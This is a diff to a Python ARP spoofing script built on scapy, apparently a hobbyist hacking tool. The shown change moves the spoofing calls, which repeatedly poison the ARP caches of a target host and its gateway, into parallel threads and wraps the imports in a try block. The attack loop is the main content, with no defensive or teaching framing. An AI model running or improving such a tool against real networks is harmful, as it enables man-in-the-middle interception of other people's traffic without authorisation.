@@ -1,10 +1,15 @@
 #!/usr/bin/env python
+try:
 
-import scapy.all as scapy
-import time
-import sys
-import os
-import optparse
+	import scapy.all as scapy
+	import time
+	import sys
+	import os
+	import optparse
+	import threading
+
+except:
+	print(f"[+] install librarys! ...")
 
 
 def getArg():
@@ -52,8 +57,12 @@ count = 0
 try:
 	while True:
 		count += 2
-		spoof(target_ip, getway_ip)
-		spoof(getway_ip, target_ip)
+		thread1 = threading.Thread(target=spoof, args=(target_ip, getway_ip))
+		thread2 = threading.Thread(target=spoof, args=(getway_ip, target_ip))
+		thread1.start()
+		thread2.start()
+		#spoof(target_ip, getway_ip)
+		#spoof(getway_ip, target_ip)
 		print("\rspoofing ..." + "packets sent "+ str(count), end=" ")
 		time.sleep(1)
 		os.system('clear')
